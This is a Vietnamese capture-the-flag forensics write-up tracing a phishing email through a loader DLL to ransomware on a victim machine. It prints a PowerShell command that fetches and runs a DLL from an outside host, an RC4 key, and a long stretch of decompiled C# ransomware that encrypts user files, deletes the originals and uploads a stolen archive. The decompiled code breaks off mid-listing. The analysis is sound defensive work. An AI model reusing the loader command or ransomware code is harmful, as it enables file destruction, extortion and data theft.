Q1 : The user opened a software that contained malicious content from the attacker. What was the name of the software? Ex: Skype

với câu hỏi đầu tiên này, khi check log thì mình có thấy một điều khá lạ là ở event ID 4798 (tiến trình liệt kê nhóm người dùng) nhưng lại chạy bởi process name : 
C:\Program Files\Mozilla Thunderbird\thunderbird.exe

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/87b21c01-f949-4965-bb75-4313bf144429" />

với mail client như thunderbird lại có hành động như vậy khá đáng nghi và có thể đang thực hiện quá trình recon xem máy nạn nhân có những quyền gì khi mã độc được kích hoạt, nên đáp án chính là 

thunderbird



Q2: khi đã tìm đc phần mềm thì mình theo đó tìm được mail nạn nhân nhận được từ hacker tại C:\Users\tmq\AppData\Roaming\Thunderbird\Profiles\pr232cok.default-release\Mail\pop.gmail.com\Inbox
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ff1d9349-a130-44c5-8079-acfb71c460fd" />


và mình thấy file đó chính là diemchuan.zip . Và đoạn base64 ở dưới khi mình decode ra chính alf file zip đó, và trong file zip đó chauws một file chính là “diemchuan.html”
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/e1a76b65-0bfb-4bfd-acb5-bb69ee04e121" />


và đó cũng là đáp án của Q2.

Q3: dựa theo những thông tin tìm được trên thì mình thấy khá giống với attacker đã sử dụng cách thức là phishing để lừa nạn nhân thông qua file điểm chuẩn 


và việc đính kèm thêm file độc hại theo thì mình tìm hiểu giống với Technique: MITRE ATT&CK T1566.001 – Spearphishing Attachment.


Q4:  What is the domain of the website where the malicious file for stage 2 is located?
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/5e100a8f-12fa-4c2f-92e2-d0453dc5d6bd" />

sau khi tải về file diemchuan.zip, mình giải nén và mở nó lên, tại đây mình thấy một domain website là https://files.sakamoto.moe/cba5703ee7fd_word.gif

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/20ee3292-58ac-43ad-976d-1358db8aa7ff" />

khi mở link đó như này, thì mình nghĩ nó là link độc hại cho stage 2

domain : sakamoto.moe


Q5:Digging into the malicious file, what was the original name of the encrypted file that was downloaded?
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/eee33793-4353-49f0-aa17-9c5cd1ceb495" />

trong evtx windows powershell mình có thấy có đoạn script 

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass —W hidden ―cOMma [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $p = Join-Path $env:TEMP l.dll; iwr https://files.sakamoto.moe/41dbe7ac7b73_loader.dll -OutFile $p; Start-Process rundll32 -ArgumentList $p,Run -Wait; del $p -Force

powershell chạy với executionpolicy và ẩn nó bằng -w hidden. và nó tải xuống 41dbe7ac7b73_loader.dll và gọi rundll32 thực thi dll vừa tải tới export run , cuối cùng sau khi xong nó sẽ xóa dấu vết

Và đây cũng là điều rõ ràng kẻ tấn công dùng powershell để tải và thực thi payload từ domain sakamoto.moe
tiếp theo phân tích file loader.dll
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/dcc1b35b-64c6-4a74-990e-3891f5a45acf" />

tại đây có thể thấy dll export hàm run() gọi FlowAllocation() rồi thoát, và trong hàm FlowAllowcation() dll lấy buffer payload rồi giải mã RC4, sau đó ghi và đánh dấu bằng chuỗi C:\Users\Public\Wiyamizu_Mitsuha_yourname và drop thành %TEMP%\steam.exe
và đoạn này mình có nhờ chat viết cho script python để decode ra url ban đầu 

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a46929f5-2c34-4429-9617-680d2e4ea58e" />

https://files.sakamoto.moe/a0f44273e748_steam.enc


Q6: What is the encryption algorithm and key to decrypt the encrypted payload? (Convert it to hex)

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/923204a4-2ea2-430b-bda3-cd5a14ada8bf" />

tại đây mình biết được thuật toán được sử dụng là RC4 , tham số thứu 2 là 0x10 nói đến việc key dài 16 bytes. Từ đây tìm tới địa chỉ 0x33e154020 và chuyển define sang array và chọn đọc 16 byte dưới dạng hex, sau đó mình dùng script để in ra kết quả:
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d6779b00-6caf-4fd8-83c4-d23f0bd41361" />
RC4_0x3a,0x2d,0x1c,0x4d,0x5e,0x2f,0x7b,0x81,0x3d,0xab,0xbc,0xcd,0xde,0x2f,0xf0,0x01

Q7: In stage 3, which C2 IP address is the user's network traffic transmit to?

sau khi có RC4 key 16byte thì mình giải mã RC4 để lấy file steam.exe từ Miyamizu_Mitsuha.yourname  bằng script.
sau khi chạy xong mình nhận đc file steam.exe.

lúc này mình có nhớ là còn một file pcapng export từ ftk ra, mình có check conversation thì thấy máy người dùng 192.168.244.131 có kết nối bất thường tới 192.168.244.129:4433.Và port 4433 (thường dùng cho beacon/C2) 
  đáp án : 192.168.244.129
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/9e87d1f8-a26a-4d20-a0aa-7169db63732d" />

Q8: The attacker made a mistake, take advantage of it and tell us the name of files encrypted by attacker's ransomware in folder Videos ?
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/17485cdd-0b6f-48d8-a884-d85d94a437c2" />
kieemr tra truy xuất Prefetch của steam.exe thì mình phát hiện mỗi một file trong các folder của tmq thì ngay sau đó lại xuất hiện thêm các dạng file cùng folder nhưng ở dạng .EHC, khả năng các file này đã bị mã hoa sbowir steam.exe
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/0fa9b6bc-0493-4e66-b7c2-51a6107151c2" />
và mình thấy trong folder Videos có file bị mã hóa chính là video.mp4


Q9:What are the contents of the file flag.txt? (Convert the content of the flag.txt to md5 and submit)
sau khi có được file steam.exe thì mình bắt đầu reverse nó.
   
```
// Decompiled with JetBrains decompiler
// Type: Maicraft.cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk
// Assembly: minecraft, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 58866215-B729-47A3-A97A-6548365F6EEC
// Assembly location: minecraft.dll inside C:\Users\caoba\Downloads\HolaCTF\evidenceeeee\steam.exe)

using minecraft;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

#nullable disable
namespace Maicraft;

internal class cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk
{
  private static Dictionary<string, string> pdZuVvKNPFSscmrJcOBSJjLEW;

  private static void lzzmjArGgUUExMsxcUOqmdCCBrduwURYMq(
    string outputArchive,
    params string[] inputFiles)
  {
    string str = string.Join(cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\uD83D\uDC9B\uD83D\uDC3D\uD83D\uDD0C\uD83D\uDD0C"), Enumerable.Select<string, string>((IEnumerable<string>) inputFiles, (Func<string, string>) (f => $"\"{f}\"")));
    Process.Start(cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\uD83C\uDF75\uD83C\uDF67\uD83C\uDF87\uD83D\uDCD3\uD83D\uDD1C\uD83C\uDE51\uD83C\uDD7F️\uD83D\uDCBF⏩⚽\uD83C\uDD7F️\uD83D\uDE8F\uD83D\uDD01\uD83D\uDEB9\uD83C\uDF0A\uD83D\uDC7B9️⃣ℹ️✒️\uD83D\uDC5E\uD83D\uDCD3\uD83D\uDE82\uD83D\uDC8F⚽\uD83D\uDC9C\uD83D\uDCAF\uD83C\uDF87\uD83C\uDF87\uD83D\uDCD3\uD83D\uDD0E\uD83D\uDC8F⚽\uD83D\uDC58\uD83D\uDC8B⛵\uD83D\uDC5E\uD83D\uDC58\uD83D\uDC7B\uD83D\uDD1C\uD83D\uDD0C"), $"a -t7z -mx5 -parameter-none \"{outputArchive}\" {str}")?.WaitForExit();
  }

  private static async Task hVQylKhewOSgWxHuxbNcBpLUQmdgVGemoKmKEvbqat(string filePath)
  {
    HttpClient JToIYNnsPTVBGdtYorgktWiMEPfUEkMGMChTBrH;
    using (MultipartFormDataContent YIYcePSZHvUeSMhUzZwoVHmOV = new MultipartFormDataContent())
    {
      YIYcePSZHvUeSMhUzZwoVHmOV.Add((HttpContent) new ByteArrayContent(File.ReadAllBytes(filePath)), cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("⏩\uD83D\uDD38\uD83D\uDC5E\uD83C\uDFC8⏩\uD83C\uDF75\uD83D\uDD0C\uD83D\uDD0C"), Path.GetFileName(filePath));
      JToIYNnsPTVBGdtYorgktWiMEPfUEkMGMChTBrH = new HttpClient((HttpMessageHandler) new HttpClientHandler()
      {
        ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator
      });
      try
      {
        HttpResponseMessage httpResponseMessage = await JToIYNnsPTVBGdtYorgktWiMEPfUEkMGMChTBrH.PostAsync(cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("9️⃣\uD83C\uDE51\uD83D\uDDFF\uD83C\uDF7A\uD83D\uDCD3\uD83C\uDE51\uD83D\uDC36\uD83D\uDD3C\uD83D\uDC9C\uD83C\uDF46\uD83C\uDFA5✒️\uD83D\uDC60\uD83D\uDD28\uD83D\uDC9B\uD83D\uDEB4\uD83D\uDC36\uD83D\uDD28\uD83C\uDE01\uD83C\uDE3A\uD83D\uDC9C\uD83C\uDFA9\uD83D\uDC9B\uD83C\uDF7A\uD83C\uDF8F\uD83D\uDCAC\uD83C\uDE3A✒️\uD83D\uDC36\uD83C\uDFA9\uD83C\uDF63\uD83D\uDD3C\uD83C\uDF8F\uD83C\uDFAD\uD83C\uDF75\uD83C\uDF67\uD83D\uDC36\uD83C\uDF46\uD83C\uDFA5\uD83D\uDD0C"), (HttpContent) YIYcePSZHvUeSMhUzZwoVHmOV);
      }
      finally
      {
        JToIYNnsPTVBGdtYorgktWiMEPfUEkMGMChTBrH?.Dispose();
      }
    }
    JToIYNnsPTVBGdtYorgktWiMEPfUEkMGMChTBrH = (HttpClient) null;
  }

  private static byte gbTxSBXvOnHlWXYrw(byte b, int rounds)
  {
    for (int index = 0; index < rounds; ++index)
      b = (byte) (((int) b ^ 165) + 37 & (int) byte.MaxValue);
    return b;
  }

  private static byte[] TxWVCaCGswNFFkFNyyuGYebzTnmKMI(byte[] plaintext, byte[] key, int rounds = 3)
  {
    byte[] numArray = new byte[plaintext.Length];
    int length = key.Length;
    for (int index = 0; index < plaintext.Length; ++index)
    {
      byte num = cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.gbTxSBXvOnHlWXYrw(key[index % length], rounds);
      numArray[index] = (byte) ((uint) plaintext[index] ^ (uint) num);
    }
    return numArray;
  }

  private static int[] OVixtxAlZgODrcwOVgagxeWAk()
  {
    int[] numArray1 = new int[256 /*0x0100*/];
    using (RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider())
    {
      byte[] numArray2 = new byte[1024 /*0x0400*/];
      ((RandomNumberGenerator) cryptoServiceProvider).GetBytes(numArray2);
      Buffer.BlockCopy((Array) numArray2, 0, (Array) numArray1, 0, numArray2.Length);
      return numArray1;
    }
  }

  private static byte[] qUipnfARjQBaBGtORUDuGAblGcanrkCStJ(string input)
  {
    using (SHA256 shA256 = SHA256.Create())
      return ((HashAlgorithm) shA256).ComputeHash(Encoding.UTF8.GetBytes(input));
  }

  private static byte[] lSJNJosACuzaDIkQoaEIkvSckaEPgrBKmY(
    byte[] data,
    out byte[] key,
    out byte[] iv)
  {
    using (Aes aes = Aes.Create())
    {
      ((SymmetricAlgorithm) aes).Mode = (CipherMode) 1;
      ((SymmetricAlgorithm) aes).Padding = (PaddingMode) 2;
      byte[] numArray = cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.qUipnfARjQBaBGtORUDuGAblGcanrkCStJ(cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\uD83C\uDE01ℹ️⛵\uD83D\uDC9A⏩\uD83D\uDC7B\uD83D\uDD0E\uD83C\uDF7A\uD83D\uDC23ℹ️⛵\uD83C\uDF7B\uD83D\uDC58ℹ️\uD83D\uDCAF\uD83D\uDE82⏩ℹ️\uD83D\uDE82\uD83C\uDF46\uD83C\uDE01\uD83D\uDCC9\uD83D\uDDFF\uD83D\uDEB49️⃣\uD83D\uDC7B\uD83D\uDC5E\uD83D\uDC5E\uD83D\uDC23\uD83C\uDF75\uD83D\uDD0C\uD83D\uDD0C"));
      key = new byte[32 /*0x20*/];
      iv = new byte[16 /*0x10*/];
      Buffer.BlockCopy((Array) numArray, 0, (Array) key, 0, 32 /*0x20*/);
      Buffer.BlockCopy((Array) numArray, 16 /*0x10*/, (Array) iv, 0, 16 /*0x10*/);
      using (ICryptoTransform encryptor = ((SymmetricAlgorithm) aes).CreateEncryptor(key, iv))
        return encryptor.TransformFinalBlock(data, 0, data.Length);
    }
  }

  private static byte[] ddAxJkAciSG(byte[] data, string publicKey)
  {
    using (RSA rsa = RSA.Create())
    {
      int num;
      ((AsymmetricAlgorithm) rsa).ImportSubjectPublicKeyInfo(ReadOnlySpan<byte>.op_Implicit(Convert.FromBase64String(publicKey)), ref num);
      return rsa.Encrypt(data, RSAEncryptionPadding.OaepSHA256);
    }
  }

  private static string eOUFdPmHAHcqPJQRyafSXBf(int length)
  {
    byte[] numArray = new byte[length];
    using (RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider())
    {
      ((RandomNumberGenerator) cryptoServiceProvider).GetBytes(numArray);
      StringBuilder stringBuilder = new StringBuilder(length);
      foreach (byte num in numArray)
        stringBuilder.Append("KitakitasuruOPQRSTUVWXYZKitakitasuruopqrstuvwxyz"[(int) num % "KitakitasuruOPQRSTUVWXYZKitakitasuruopqrstuvwxyz".Length]);
      return stringBuilder.ToString();
    }
  }

  private static void eLzUcATejKPOKKMlaYnpnwtwzJclOfwjWFRoaxlxd(string[] dirs, string pubKey)
  {
    ISAAC isaac = new ISAAC(cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.OVixtxAlZgODrcwOVgagxeWAk());
    byte[] numArray1 = new byte[32 /*0x20*/];
    for (int index = 0; index < numArray1.Length; ++index)
      numArray1[index] = (byte) isaac.Next();
    byte[] key;
    byte[] iv;
    byte[] numArray2 = cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.ddAxJkAciSG(Enumerable.ToArray<byte>(Enumerable.Concat<byte>(Enumerable.Concat<byte>((IEnumerable<byte>) cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.lSJNJosACuzaDIkQoaEIkvSckaEPgrBKmY(numArray1, out key, out iv), (IEnumerable<byte>) key), (IEnumerable<byte>) iv)), pubKey);
    string str1 = Path.Combine(Path.GetTempPath(), cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\uD83D\uDD01ℹ️\uD83D\uDD0E\uD83C\uDF87\uD83C\uDE01⚽\uD83C\uDD7F️\uD83D\uDE8F⏩\uD83C\uDF7B\uD83D\uDDFF\uD83C\uDF6F") + Guid.NewGuid().ToString());
    Directory.CreateDirectory(str1);
    File.WriteAllBytes(Path.Combine(str1, cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("9️⃣\uD83D\uDC0F\uD83D\uDC5E\uD83C\uDF7A\uD83C\uDE01\uD83D\uDEB9⛵\uD83D\uDC88⏩\uD83D\uDCC9\uD83C\uDF63\uD83D\uDD0C")), numArray2);
    List<string> stringList = new List<string>();
    string folderPath = Environment.GetFolderPath((Environment.SpecialFolder) 40);
    foreach (string dir in dirs)
    {
      string str2 = Path.Combine(folderPath, dir);
      if (Directory.Exists(str2))
      {
        foreach (string file in Directory.GetFiles(str2))
        {
          stringList.Add(file);
          try
          {
            byte[] numArray3 = cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.TxWVCaCGswNFFkFNyyuGYebzTnmKMI(File.ReadAllBytes(file), numArray1);
            string str3 = cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.eOUFdPmHAHcqPJQRyafSXBf(20);
            File.WriteAllBytes(Path.Combine(Path.GetDirectoryName(file), str3 + cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\uD83D\uDC9C\uD83C\uDF63\uD83D\uDCAF\uD83D\uDC9B\uD83C\uDF75\uD83D\uDC8F\uD83D\uDD0C\uD83D\uDD0C")), numArray3);
            File.Delete(file);
            Thread.Sleep(500);
          }
          catch
          {
          }
        }
      }
    }
    File.WriteAllLines(Path.Combine(str1, cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\uD83D\uDD01⚽\uD83C\uDD7F️\uD83C\uDF87⏩\uD83D\uDC0F\uD83D\uDC5E\uD83D\uDEB4\uD83C\uDE01ℹ️✒️\uD83C\uDF6F⏩\uD83D\uDD38\uD83D\uDC5E\uD83C\uDFC8⏩\uD83D\uDCC9\uD83D\uDC36\uD83D\uDEB4\uD83D\uDC23\uD83C\uDE51\uD83D\uDE8F\uD83C\uDF7A")), (IEnumerable<string>) stringList, Encoding.UTF8);
    string str4 = Path.Combine(str1, cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\uD83D\uDCD3\uD83D\uDC7B\uD83D\uDD0E\uD83C\uDFA99️⃣\uD83D\uDC0F\uD83D\uDD0E\uD83C\uDF7B⏩\uD83D\uDEB9\uD83C\uDE3A⚽\uD83D\uDC58\uD83D\uDCBB\uD83D\uDD0C\uD83D\uDD0C"));
    string[] files = Directory.GetFiles(str1);
    cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.lzzmjArGgUUExMsxcUOqmdCCBrduwURYMq(str4, files);
    cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.hVQylKhewOSgWxHuxbNcBpLUQmdgVGemoKmKEvbqat(str4).Wait();
    Thread.Sleep(5000);
    Directory.Delete(str1, true);
  }

  private static void Main()
  {
    string pubKey = cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\uD83D\uDD28\uD83D\uDD1C\uD83D\uDC5E\uD83C\uDD7F️\uD83C\uDF75\uD83C\uDF63\uD83D\uDC5E\uD83D\uDE9B\uD83C\uDF75\uD83D\uDD1C⛵\uD83D\uDCAC⏩\uD83D\uDC0F\uD83D\uDE0D✒️9️⃣\uD83D\uDC7B\uD83D\uDE0D\uD83C\uDF87\uD83D\uDDFF\uD83C\uDF67\uD83D\uDC5E⚽\uD83D\uDC36\uD83C\uDF06\uD83C\uDD7F️\uD83C\uDF0A\uD83D\uDD1C\uD83D\uDD1C\uD83D\uDCAF\uD83D\uDC7B\uD83C\uDF75\uD83D\uDD1C\uD83D\uDD0E\uD83C\uDF83\uD83C\uDF75\uD83C\uDF7A\uD83D\uDD0E\uD83D\uDDFF\uD83D\uDC60\uD83C\uDF06\uD83D\uDD0E\uD83C\uDF8F\uD83D\uDEB9\uD83D\uDD1C\uD83D\uDC5E\uD83D\uDCAC\uD83C\uDF75\uD83D\uDC0F\uD83D\uDC23\uD83D\uDC9C\uD83C\uDF75\uD83C\uDF7A\uD83D\uDD0E\uD83D\uDDFF\uD83D\uDDFF\uD83D\uDD1C\uD83C\uDF06\uD83D\uDC8F\uD83D\uDD28\uD83D\uDD38\uD83D\uDE8F\uD83D\uDE8F\uD83D\uDEB9ℹ️\uD83D\uDC5E⚽\uD83D\uDDFF\uD83D\uDD1C\uD83D\uDD0E\uD83D\uDCBF\uD83C\uDE01\uD83C\uDFA9⏩\uD83D\uDCBF\uD83D\uDD28\uD83D\uDD38\uD83D\uDE82✒️\uD83D\uDD1C\uD83D\uDD38\uD83C\uDF06\uD83D\uDE82\uD83D\uDD28\uD83D\uDC0F⛵\uD83C\uDF83ℹ️\uD83D\uDD28⏩\uD83C\uDF0A\uD83D\uDD28\uD83C\uDF46\uD83D\uDE0D\uD83D\uDD1C⏩\uD83C\uDFAD\uD83C\uDD7F️\uD83C\uDE01\uD83C\uDF8F\uD83D\uDC0F\uD83D\uDE82\uD83C\uDF8F⏩\uD83D\uDC0F\uD83D\uDC23\uD83C\uDDEA\uD83C\uDDF8\uD83C\uDE01\uD83C\uDF7A\uD83D\uDC5E\uD83C\uDFA9\uD83D\uDEB9\uD83D\uDD1C\uD83C\uDF7A\uD83C\uDE3A\uD83D\uDC9C\uD83D\uDE82⏩\uD83D\uDC8B\uD83D\uDC23\uD83C\uDFA9\uD83D\uDD0E\uD83D\uDC0F\uD83D\uDD01\uD83C\uDF7B\uD83D\uDCAF\uD83D\uDE8F\uD83C\uDDEA\uD83C\uDDF8⚽\uD83D\uDC9A\uD83C\uDF67\uD83D\uDC36\uD83C\uDF7A\uD83D\uDD1C✒️⏩\uD83C\uDF63\uD83D\uDD0E\uD83D\uDCAF\uD83C\uDE01\uD83D\uDE82\uD83D\uDDFF\uD83C\uDD7F️⏩\uD83D\uDCAF\uD83D\uDDFF\uD83D\uDC9B\uD83D\uDDFF\uD83C\uDF06\uD83D\uDC5E\uD83C\uDF87\uD83D\uDD28\uD83D\uDCAF\uD83C\uDD7F️\uD83D\uDD28\uD83D\uDDFF\uD83D\uDD28\uD83D\uDDFF\uD83C\uDFAD⏩\uD83C\uDF06\uD83C\uDF8F\uD83C\uDF8F\uD83D\uDD1C⚽\uD83C\uDF63✒️\uD83D\uDDFF\uD83C\uDF06\uD83C\uDF06\uD83D\uDC0F9️⃣\uD83C\uDF7A\uD83D\uDCBB\uD83D\uDC88\uD83D\uDC58\uD83D\uDC7B\uD83D\uDE8F\uD83D\uDC60\uD83C\uDF8F\uD83D\uDE82\uD83C\uDF8F\uD83C\uDF67\uD83D\uDC60ℹ️⛵\uD83D\uDC9B\uD83D\uDD01\uD83D\uDC5E\uD83D\uDDFF\uD83C\uDF06\uD83D\uDDFF\uD83C\uDF63⛵\uD83D\uDC9A\uD83D\uDD1C\uD83D\uDD38\uD83D\uDC23\uD83C\uDF83\uD83D\uDC58\uD83C\uDF7B\uD83D\uDCAF\uD83D\uDE0D\uD83C\uDF8F\uD83D\uDC0F\uD83C\uDE01\uD83C\uDF46\uD83D\uDC58\uD83C\uDF7B\uD83D\uDD0E\uD83C\uDE51\uD83D\uDEB9\uD83D\uDD38\uD83D\uDEBE⚽\uD83D\uDDFF\uD83D\uDCC9⏩\uD83D\uDC88⏩\uD83D\uDD1C\uD83D\uDE0D\uD83D\uDC9A\uD83D\uDC60\uD83D\uDD1C\uD83C\uDE3A\uD83D\uDC8F\uD83D\uDD01\uD83D\uDD38\uD83C\uDF8F\uD83C\uDF67\uD83D\uDC23ℹ️\uD83D\uDC5E\uD83D\uDE0D\uD83D\uDDFF\uD83D\uDC7B\uD83C\uDF06\uD83C\uDF46\uD83C\uDDEA\uD83C\uDDF8\uD83C\uDF7A✒️\uD83D\uDC8F\uD83D\uDCAF\uD83D\uDD1C\uD83D\uDDFF\uD83D\uDD28\uD83D\uDD1C\uD83C\uDE51\uD83D\uDCBB\uD83D\uDE82\uD83D\uDC36⚽\uD83D\uDC23\uD83C\uDD7F️\uD83D\uDEB9\uD83C\uDF63\uD83C\uDF63\uD83C\uDF67\uD83D\uDC58\uD83D\uDD0E\uD83D\uDDFF\uD83D\uDD28\uD83D\uDCAF\uD83C\uDE51\uD83D\uDDFF\uD83C\uDF83⏩\uD83D\uDD28\uD83D\uDDFF\uD83D\uDD28⏩\uD83D\uDD1C\uD83C\uDD7F️\uD83D\uDD38\uD83D\uDC23\uD83C\uDFAD\uD83D\uDC23\uD83C\uDF0A\uD83D\uDCD3\uD83C\uDF63\uD83C\uDF06\uD83D\uDE82\uD83D\uDC58\uD83D\uDC7B\uD83D\uDCD3\uD83D\uDC0F\uD83D\uDCAF\uD83D\uDCC9\uD83C\uDF87\uD83D\uDEB4\uD83D\uDC9C\uD83D\uDE82\uD83D\uDC9A\uD83C\uDF7A\uD83C\uDF75\uD83D\uDCC9\uD83D\uDE8F\uD83D\uDE82\uD83D\uDCAF\uD83C\uDFA9\uD83C\uDE01\uD83C\uDF7A\uD83D\uDDFF\uD83D\uDD1C\uD83C\uDD7F️\uD83D\uDCAC\uD83D\uDC23\uD83D\uDCC9\uD83D\uDD0E\uD83D\uDC9B\uD83C\uDDEA\uD83C\uDDF8\uD83D\uDC0F\uD83D\uDD0E\uD83C\uDF75\uD83D\uDEB9\uD83D\uDD28\uD83D\uDD1C\uD83C\uDF67\uD83D\uDCAF\uD83C\uDFAD\uD83D\uDDFF\uD83D\uDCBF\uD83D\uDD1C\uD83D\uDD1C\uD83D\uDC5E\uD83D\uDC88\uD83C\uDF8F\uD83C\uDF63\uD83D\uDD0E\uD83D\uDD0E\uD83D\uDD28\uD83C\uDE51\uD83C\uDF0A\uD83D\uDD38\uD83C\uDF75ℹ️\uD83C\uDE3A\uD83D\uDE82\uD83D\uDD01\uD83D\uDD28\uD83D\uDC9B\uD83C\uDF46\uD83C\uDF75\uD83D\uDE82\uD83D\uDC9A\uD83C\uDF7A\uD83D\uDC60\uD83D\uDD0E\uD83D\uDE8Fℹ️\uD83D\uDCD3\uD83D\uDC8B\uD83D\uDE0D\uD83C\uDF87\uD83D\uDD28\uD83C\uDF46\uD83D\uDE0D\uD83D\uDE82\uD83C\uDF8F\uD83D\uDC0F\uD83D\uDE8F\uD83C\uDDEA\uD83C\uDDF8\uD83D\uDCD3\uD83C\uDF06\uD83D\uDDFF\uD83D\uDD28\uD83D\uDC23\uD83C\uDF63\uD83D\uDE82\uD83D\uDC9C\uD83D\uDCAF\uD83D\uDC7B\uD83D\uDE82\uD83C\uDE51\uD83C\uDF8F\uD83C\uDF67\uD83D\uDC5E⛵9️⃣\uD83C\uDFAD\uD83D\uDC23\uD83C\uDF7B\uD83D\uDD01ℹ️\uD83D\uDC23\uD83D\uDC7B⏩⚽\uD83D\uDC23\uD83C\uDF0A\uD83D\uDD28\uD83D\uDD1C\uD83D\uDC8F⚽\uD83C\uDE01\uD83D\uDE82\uD83C\uDF8F\uD83D\uDC9B\uD83D\uDEB9\uD83D\uDD0E\uD83D\uDDFF\uD83C\uDF8F⏩\uD83D\uDCAF\uD83C\uDF0Aℹ️9️⃣\uD83D\uDCAF\uD83D\uDC5E\uD83D\uDCBF9️⃣\uD83C\uDF67\uD83D\uDD0E\uD83D\uDD28\uD83D\uDD1C⚽\uD83D\uDCAF\uD83D\uDC88\uD83D\uDEB9\uD83D\uDC7B\uD83D\uDCAF\uD83D\uDEB9⏩\uD83C\uDF06\uD83D\uDCAF\uD83D\uDE8F\uD83D\uDDFF\uD83D\uDD38\uD83C\uDFC8\uD83C\uDE3A\uD83D\uDD28\uD83D\uDD28⏩\uD83D\uDE8F9️⃣\uD83D\uDD1C\uD83D\uDCAF✒️ℹ️ℹ️\uD83D\uDC36⚽\uD83D\uDC9C\uD83C\uDF7A\uD83D\uDD0E\uD83C\uDFA9\uD83D\uDCAF\uD83D\uDE82\uD83C\uDF8F\uD83D\uDEB4\uD83D\uDEB9\uD83D\uDC7B\uD83D\uDCAF\uD83C\uDE01\uD83D\uDCD3\uD83D\uDD0E\uD83D\uDE8F\uD83C\uDDEA\uD83C\uDDF8\uD83D\uDD28\uD83D\uDD38⏩\uD83D\uDD0E\uD83D\uDDFFℹ️\uD83C\uDF8F\uD83C\uDFAD\uD83D\uDD28\uD83C\uDE51\uD83D\uDCAF\uD83C\uDFAD\uD83D\uDCD3\uD83D\uDD1C⛵\uD83D\uDE9B\uD83C\uDF8F\uD83D\uDC0F⏩\uD83C\uDFA9\uD83D\uDCAF\uD83C\uDFAD\uD83D\uDC9B\uD83D\uDE82⏩\uD83D\uDC0F\uD83D\uDE82\uD83D\uDD0E\uD83D\uDC23\uD83C\uDF7A\uD83D\uDCD3\uD83D\uDE82\uD83D\uDD01\uD83D\uDD0E\uD83D\uDC5E\uD83C\uDFA9ℹ️ℹ️\uD83C\uDF87\uD83D\uDC88\uD83C\uDF8F\uD83D\uDCC9\uD83C\uDF87\uD83C\uDF7B\uD83D\uDD01\uD83D\uDD0E\uD83C\uDF0A\uD83D\uDD38\uD83C\uDDEA\uD83C\uDDF8\uD83D\uDC0F\uD83D\uDE0D\uD83C\uDDEA\uD83C\uDDF8\uD83D\uDC36\uD83D\uDD0E\uD83D\uDD0E\uD83C\uDD7F️\uD83D\uDDFF\uD83C\uDF06\uD83D\uDD0E\uD83D\uDDFF\uD83C\uDF75\uD83D\uDD1C\uD83D\uDC9B\uD83D\uDD0C");
    cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.eLzUcATejKPOKKMlaYnpnwtwzJclOfwjWFRoaxlxd(new string[5]
    {
